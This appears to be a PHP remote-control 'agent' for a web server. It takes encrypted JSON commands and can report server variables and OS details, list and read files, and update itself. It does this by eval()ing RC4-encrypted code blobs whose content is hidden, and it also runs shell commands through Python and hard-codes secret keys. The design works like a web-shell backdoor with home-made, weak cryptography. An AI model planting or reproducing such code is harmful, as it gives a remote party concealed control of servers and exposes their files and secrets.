<?php
define("TOKEN", 'JkezEZ?I$FQ0Lfw2I0MTPRE*!D2H_SV|!A|h1fzm9UIu3b@+PlPYM#vTe&|9MXhE');
					define("KEY",'50jgK^*S2%SZDjZGjFP|m+9MbSWJFSdSfB+Sv|CHlR-%R#bYSx^39IS?t_Ru$bBr');
					define("DEBUG",false);
/*if you will need to specify root directory, you can set it below. please use full path*/
define("ROOT",'/var/www/cybersec');
/*agent version stores in this constant*/
define("AGENT",1);
/*debug boolean for testing purpose*/
function getCache(){
    $files = array();
    $pre = '.';
    if(DEBUG===true)
        $pre.='v1';
    $name = $pre.basename($_SERVER["SCRIPT_NAME"])."";
    $path = session_save_path();
    if(strlen($path)>0 && substr($path, -1)!=="/") $path .= "/";
    array_push($files,$path.$name);
    array_push($files,$name);
    $path = sys_get_temp_dir();
    if(strlen($path)>0 && substr($path, -1)!=="/") $path .= "/";
    array_push($files,$path.$name);
    $responses = "null%20-2";
    foreach($files as $index=>$file){
        if(file_exists($file)===true){
            if(is_readable($file)===true && is_writable($file)){
                return $file."%201";
            }else{
                return $file."%20-1";
            }
        }else{
            if(file_put_contents($file,"helloworld")!==false){
                @unlink($file);
                return $file."%200";
            }else{
                $responses = $file."%20-2";
            }
        }
    }
    return $responses;
}
function getLastKey($cache=null,$keyOnly=true,$ignoreStatus=false){
    if($cache===null)
        $cache = getCache();
    if(strpos($cache,"%201")!==false){
        $fullLine = file_get_contents(explode("%20",$cache)[0]);
        if($fullLine===false){
            handleError(31);
        }
        if(DEBUG===false){
            $fullLine = base64_decode($fullLine);
            $fullLine = rc4(KEY,$fullLine);
        }
        $status = (int)(explode(",",$fullLine)[3]);
        if(($status>0 && $ignoreStatus===false) || $ignoreStatus===true){
            if($keyOnly===true)
                return explode(",",$fullLine)[0];
            else
                return $fullLine;
        }
    }
    return KEY;
}
function rc4($key, $str) {
    if(strlen($key)>0){
        $s = array();
        $size = 256;
        for ($i = 0; $i < $size; $i++) {
            $s[$i] = $i;
        }
        $j = 0;
        for ($i = 0; $i < $size; $i++) {
            $j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % $size;
            $x = $s[$i];
            $s[$i] = $s[$j];
            $s[$j] = $x;
        }
        $i = 0;
        $j = 0;
        $res = "";
        for ($y = 0; $y < strlen($str); $y++) {
            $i = ($i + 1) % $size;
            $j = ($j + $s[$i]) % $size;
            $x = $s[$i];
            $s[$i] = $s[$j];
            $s[$j] = $x;
            $res .= $str[$y] ^ chr($s[($s[$i] + $s[$j]) % $size]);
        }
    }else{
        handleError(51);
    }
    return $res;
}
function receiveJson($input){
    if(DEBUG===false){
        $hmachash = substr($input,0,32);
        $encryptedJson = substr($input,32,strlen($input)-32);
        if(DEBUG===true){
            $encryptedJson = base64_decode($encryptedJson);
        }
        $result = hash_hmac("md5",TOKEN,$encryptedJson);
        if($hmachash!==$result){
            handleError(52);
        }else{
            $input = rc4(getLastKey(),$encryptedJson);
        }
    }
    $isJson = isJson($input);
    if($isJson>0){
        handleError($isJson);
    }
    return $input;
}
function sendJson($json){
    if(DEBUG===false){
        $encryptedJson = rc4(getLastKey(),$json);
        //$encryptedJson = base64_encode($encryptedJson);
        $json = hash_hmac("md5",TOKEN,$encryptedJson).$encryptedJson;
    }
    return $json;
}
function seeJsonErrors($error){
    $result = 0;
    switch ($error) {
        case JSON_ERROR_NONE:
            $result = 0;
        break;
        case JSON_ERROR_DEPTH:
            $result = 21;
        break;
        case JSON_ERROR_STATE_MISMATCH:
            $result = 22;
        break;
        case JSON_ERROR_CTRL_CHAR:
            $result = 23;
        break;
        case JSON_ERROR_SYNTAX:
            $result = 24;
        break;
        case JSON_ERROR_UTF8:
            $result = 25;
        break;
        default:
            $result = 26;
        break;
    }
    return $result;
}
function isJson($string) {
    json_decode($string);
    $code = seeJsonErrors(json_last_error());
    if($code===0)
        return 0;
    else
        return seeJsonErrors($error);
}
function handleError($code){ 
    header("Content-Type: application/json",true);
    $result = 
    '{
        "version":"'.AGENT.'",
        "error":'.$code.'
    }';
    $result = sendJson($result);
    echo $result;
    exit();
}
function getSystemConst(){
    return dechex(date("YmdHis",filectime(__FILE__))).dechex(date("YmdHis",filemtime(__FILE__)));
}
$json = file_get_contents("php://input");
if($json===false)
    handleError(11);
$json = receiveJson($json);
//header("Content-Type: application/json");
//echo $json;
if(empty($_GET) && strlen($json)>0){
    $obj = json_decode($json);
    if(isset($obj->cmd)){
        if($obj->cmd!=="get_file"){
            header("Content-Type: application/json", true);
            class Response{
                public $version, $result, $error, $allocatedRAM;
            }
            $response = new Response();
            $response->version = AGENT;
        }
        if($obj->cmd==="init"){
            //init start
            if(isset($obj->params)===false){
                //for unauthenticated request
                class Result{
                    public $agent_writable, $cache_status, $system_const;
                }
                $response->result = new Result();
                $response->result->agent_writable = (is_writable(__FILE__))?1:0;
                $cache = explode("%20",getCache());
                $response->result->cache_status = (int)$cache[1];
                $response->result->system_const = getSystemConst();
                //end for unauthenticated
            }else{
                //for authenticated request
                
                //end for authenticated
            }
            //init end
        }else if($obj->cmd==="auth"){
            //auth start
            function generateRandomNumber($length){
                $result = "";
                for($i=0;$i<$length;$i++){
                    $result.=$i===0?mt_rand(1,9):mt_rand(0,9);
                }
                return $result;
            }
            function generateRandomString($length = 10) {
                $characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
                $charactersLength = strlen($characters);
                $randomString = "";
                for ($i = 0; $i < $length; $i++) {
                    $randomString .= $characters[rand(0, $charactersLength - 1)];
                }
                return $randomString;
            }
            function decToHex($dec){
                $hex = array();
                while ($dec) {
                    $modulus = bcmod($dec, "16");
                    array_unshift($hex, dechex($modulus));
                    $dec = bcdiv(bcsub($dec, $modulus), 16);
                }
                return implode("", $hex);
            }
            function hexToDec($hex){
                $dec = 0;
                $len = strlen($hex);
                for ($i = 1; $i <= $len; $i++) {
                    $dec = bcadd($dec, bcmul(strval(hexdec($hex[$i - 1])), bcpow("16", strval($len - $i))));
                }
                return $dec;
            }
            function strToHex($string){
                $hex = "";
                for ($i=0; $i<strlen($string); $i++){
                    $ord = ord($string[$i]);
                    $hexCode = dechex($ord);
                    $hex .= substr("0".$hexCode, -2);
                }
                return strToUpper($hex);
            }
            function hexToStr($hex){
                $string="";
                for ($i=0; $i < strlen($hex)-1; $i+=2){
                    $string .= chr(hexdec($hex[$i].$hex[$i+1]));
                }
                return $string;
            }
            function powermod($base,$exponent,$modulus) {
                $result = 0; $calculated = false;
                if(function_exists("gmp_powm")){
                    $result = gmp_strval(gmp_powm($base,$exponent,$modulus));
                    $calculated = true;
                }else if(is_executable(__FILE__)){
                    $content = "from __future__ import print_function"."\r\n".
                        "import random"."\r\n".
                        "b = int(\"".$base."\")"."\r\n".
                        "e = int(\"".$exponent."\")"."\r\n".
                        "m = int(\"".$modulus."\")"."\r\n".
                        "r = pow(b,e,m)"."\r\n".
                        "print(r, end=\"\")";
                    $name = "dh.py";
                    @file_put_contents($name,$content);
                    $result = @shell_exec("python ".$name);
                    if(strlen($result)>0)
                        $calculated = true;
                    @unlink($name);
                }
                if($calculated===false){
                    $result = bcpowmod($base,$exponent,$modulus);
                }
                return $result;
            }
            function saveKey($combination){
                $cache = getCache();
                if(strpos($cache,"%201")!==false || strpos($cache,"%200")!==false){
                    $filepath = explode("%20",$cache)[0];
                    if(DEBUG===false){
                        $combination = rc4(KEY,$combination);
                        $combination = base64_encode($combination);
                    }
                    return file_put_contents($filepath,$combination);
                }else
                    return false;
            }
            if(isset($obj->params)===true){
                if(isset($obj->params->step)===true){
                    $cache = getCache();
                    if($obj->params->step!==0){
                        class Result{
                            public $data, $keySaved, $cacheFile;
                        }
                        $response->result = new Result();
                        $response->result->cacheFile = $cache;
                    }    
                    if($obj->params->step===1 && isset($obj->params->data)===true){
                        // auth step 1 start
                        $data = $obj->params->data;
                        $chunks = explode(",",$data);
                        if(sizeof($chunks)===3){
                            $p = hexToDec($chunks[0]);
                            $g = hexToDec($chunks[1]);
                            $A = hexToDec($chunks[2]);
                            $b = generateRandomNumber(617);
                            $B = decToHex(powermod($g,$b,$p));
                            $kb = decToHex(powermod($A,$b,$p));
                            $key = hash("sha256",$kb.strToHex(getLastKey()).getSystemConst());
                            $originalTest = generateRandomString(50);
                            $test = rc4($key,$originalTest);
                            $response->result->data = $B.",".base64_encode($test);
                            $response->result->keySaved = saveKey($key.",".md5($originalTest).",".decToHex(date("YmdHis")).",0")!==false?true:false;
                        }
                        // auth step 1 end
                    }else if($obj->params->step===2 && isset($obj->params->data)===true){
                        // auth step 2 start
                        $data = $obj->params->data;
                        if(strpos($cache,"%201")!==false || strpos($cache,"%200")!==false){
                            $fullLine = getLastKey($cache,false,true);
                            $datetime = (int)hexToDec(explode(",",$fullLine)[2]);
                            $now = (int)date("YmdHis");
                            $response->result->status = -1;
                            if((DEBUG===false && $now-$datetime<=60) || DEBUG===true){
                                $originalTest = explode(",",$fullLine)[1];
                                if($originalTest===$data){
                                    $response->result->status = 0;
                                    $response->result->keySaved = saveKey(explode(",",$fullLine)[0].",".$originalTest.",".explode(",",$fullLine)[2].",1")!==false?true:false;
                                }
                            }
                        }
                        // auth step 2 end 
                    }else if($obj->params->step===0){
                        // auth step 0 start
                        if(strpos($cache,"%201")!==false || strpos($cache,"%200")!==false){
                            $fullLine = getLastKey($cache,false,true);
                            class Result{
                                public $status, $keySaved;
                            }
                            $response->result = new Result();
                            $response->result->status = 0;
                            $originalTest = explode(",",$fullLine)[1];
                            $response->result->keySaved = saveKey(explode(",",$fullLine)[0].",".$originalTest.",".explode(",",$fullLine)[2].",-1")!==false?true:false;
                        }
                        // auth step 0 end
                    }
                }
            }
            //auth end
        }else if($obj->cmd==="status"){
            //status start
            class Result{
                public $php_version,$php_server,$os_info;
            }
            $result = new Result();
            $result->php_version = phpversion();
            $result->php_server = $_SERVER;
            $result->os_info = php_uname();
            $response->result = $result;
            //status end
        }else if($obj->cmd==="get_tree"){
            //get tree
            /*place encrypted function getTree here*/
$getTree_encrypted='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';

            if(function_exists("getTree")===false){
                $getTree_encrypted = base64_decode($getTree_encrypted);
                eval(rc4($obj->params->key,$getTree_encrypted));
                if(function_exists("getTree")===false)
                    handleError(61);
            }
            $response = getTree($response);
            //get tree end
        }else if($obj->cmd==="get_file"){
            //get file
$getFile_encrypted='jX8F2A4gLXVMqCc61TUSt8GzLScSS3Y6xpH9VqiQWdUWwmVdx9sDyJ+QUcMGhV3g39ZQTh/mZIUMeoHPsd+5bwB1URbOf3Qx0B7GS0Y9Jrsqwd3qjviPXlWqwxCPsd6G31G9J97QoBFdJw3pywP1uuB4uuGeqNsEm4E2fFGVPtQFCHL6MkO2qvL/l7TlFeHPIrwgwSqqCdgfEOO1l3g8yxeRgPr9HP+YTbm3Wtge2VTJinEqEXk+ZY1MrH08MJMGxoj9v0o9rUo8P92BVXQGQ1LuOAdJ3OzvD9GMN6SQFshvuNVJJJNKDJ78S1sjSXSXNG00S0z3uoEGseBkiQsscihwGPF/Y93vvwb9KEiEwWoxvjantgl6HjUDCTkBm4WfMVeUfGwApoFw6rplmV7cY15ENXwIjPqaungGk4nT1S1w+JRB0KiR8VIz4Yti1+a5VCglU1kdjV0nusxkkmf7blifOgJ9DdVagxd9eBWZK1pZPoQsJB921eCeNCQ9JBlLpHaCqP70K0T4IMclEw1HNlAJKiyeXAfH03Je0ujHdYFguZwFIvrJ35WUZLB0Kxhf6cIHY2jKoJ42RLoZd2z2IqznQxPQEezzECObI6bWg6cG6xeHONsglQOIb3FrHjJXTJeWxIWkqxbI9Z1m22SjZPjxwSuPnxtkESUsm9+sAMTOogHuJm4IEIqXp+CnBMb3aekIAFtMvdIIXtIUZpck9Gi3EB6a/Km5u+WNJ13rhSTB0taU3DktYTbaxk/ndMIXV6QbpSlm3JJmZ3b5/8DbDQa/fz00XNln79MKlYdfCGx2VfvKOEIkkq512dXFsBXbib93m+yCyq4c/v2tbynlVQtip9SC3uN/2L/RgcAZaonXAY/fHFXV15epCvoJ70yUjKejmJUivexVJ2gdE1dnkm88j5WA5zXPBchjlgDXEXsPdwZXzUq+nIZ/Rs1sv/WkttG2cN+KSVfpfkafFdsvPh455CTYPz9iLmph4+3W8l0frT9dOgCcKxQm/eYAB+0LBZ+ohBZPZKOy43exO/BwacoFKeoVNUdzXzksGjFDhtNj5f4yG639vw1o5WCYqGC8c8u4sZIfOEVxZiFf9pgIE1RjY+V+IosAtjX82AhnpajH4SbiUui7lSO5x9Cb3hMm1y6/bnbJ8hSwOBWgw+ibRt6DqbvSGCdD45tC/C1Y+q04xsR0tCZHHzY05vLKo/Ejc8GeEWkaSRxpwOhhY6InLgCVIoJSRuKYuHyeWcDf6/nnmEujcHIvizlck3deJzUeqy0jeVXfXB3R4E+sjtqswwKTIGGJhm9DjnMFTxU4N61btrDE+hx2Ex0pamhBR27MA6i0BnS4B7nH656xXE+4uIdwVqNcq8SLiNKvTxD4zbRNYIPXEtjJFyZVVu7xSUWxf2dIa5KT3EblmMFraebRhlD8s397Ks56VedcqZV9TBAwPp1oDdfuzEvMp76KISI5uIfm1ZqaY8StIYUNVQIXD/UVFflgHN3eeJJD3sfNaEZYeID58hvhJTtnzUYlpVcok/ckB+/WPkXeXUcIjrA6sBJJUu9XrodKdZc5UQ8/LSf+h8qYUGRuq1AUb0dL6Pi2VzbKbayBRmU7dm9mBZtrX5HljQksJ8aDCBYZMT27K1Vq05HjqCbt/DJwhMEEi5p6HIB+oPfYck6N+JMHfhEgO8+H4ErSytRCGfLmg7FuaKTOVIbkYEEAk+1i0I+6yBz+TTlF+ebEQKnYAXygRtAUtw/t5fimhjOl6VJOlWVF96bI1CkmXQ==';

            if(function_exists("getFile")===false){
                $getFile_encrypted = base64_decode($getFile_encrypted);
                eval(rc4($obj->params->key,$getFile_encrypted));
                if(function_exists("getFile")===false)
                    handleError(62);
            }
            getFile($obj);
            //get file end
        }else if($obj->cmd==="update"){
            //update
$update_encrypted='6QPXpgehN4DoEEEXet+T3POSs/ipmRhoFk4C4xywNKgshnrMOrScIOS8d7rkL+2WIJKsLYNf2Wkc5lFsbBLgzQ3M7FkbLftE2UHfWHG2Riqmn4UPP9g2ITKZnUsv8CbR2zU3kmG5Z0M3egGJA0hr8ny7f0pbEAqW/DUpzagOEqi8osRgITE1Qyxx1HNkUT5C1EiFSoivalg3IZ/Dyb01zdwgAMvvA+GH5nOAG1remSPF98Nl/c9ag27ggPe9JqCMsSK4tG0U+UHVtQlV8hpiiPYjLoW99o6tAeBE7KWENPFjMZr+GxluSAvTiY+5A0VDo4TpXtxYmwBQ81FJlsm3nBIJ5s1H431FisLq9kmhXqtltxdrPDxva01N6BXiq96yGFfMTAugbVOyBay/2v+8oYBfLx6yvZ1PWWebTDq7vihlT7ZzrD3ZnwcbJnA2yDRTssWOMsdKhz5okzN6AZiV22eqb9zocVujapomCFK1ppUxczKcn7PVf2ft9jUrXgbn+lclgDaCuL/iQYXm4+7Bvhx1J2E5MZ+YT4mjApaGzlfiIsgWq04WwLmBE91vRKqhd8dAcIJXbZgXl/IhaUSm2WBguNPgoMtwkwG01pxo+tZ+0JlrLNfGazTW6i2a9Ar0SLCHeFCqcZ9lDtAL7y0hfOLTAsNNmoo+4x5GmleCf6Ay3YHmujQlxFjXNVhVE+WYdXWTZPSG7o6wCWn4RVKA1aVWjZqziLBdgeihgGLBdlRHlmBW/L1rLK3AxqAVTcni20PVd86sZPr0';

            if(function_exists("update")===false){
                $update_encrypted = base64_decode($update_encrypted);
                eval(rc4($obj->params->key,$update_encrypted));
                if(function_exists("update")===false)
                    handleError(63);
            }
            update($obj,$response);
            //update end
        }else{
            handleError(54);
        }
        if($obj->cmd!=="get_file"){
            $response->allocatedRAM = memory_get_usage(true);
            echo sendJson(json_encode($response));
        }
        exit();
    }
}
handleError(55);
exit();